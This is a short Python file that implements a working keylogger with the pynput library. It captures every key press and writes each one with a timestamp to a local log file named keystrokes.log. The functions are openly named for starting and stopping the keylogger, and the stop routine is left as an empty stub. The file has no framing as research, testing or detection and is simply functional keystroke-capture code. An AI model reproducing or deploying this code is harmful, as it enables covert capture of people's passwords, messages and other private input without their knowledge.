from pynput.keyboard import Listener
import logging

logging.basicConfig(filename="keystrokes.log", level=logging.DEBUG, format="%(asctime)s: %(message)s")

def on_press(key):
    logging.info(str(key))

def start_keylogger():
    with Listener(on_press=on_press) as listener:
        listener.join()

def stop_keylogger():
    # Implement a way to stop the keylogger based on your application's needs
    pass
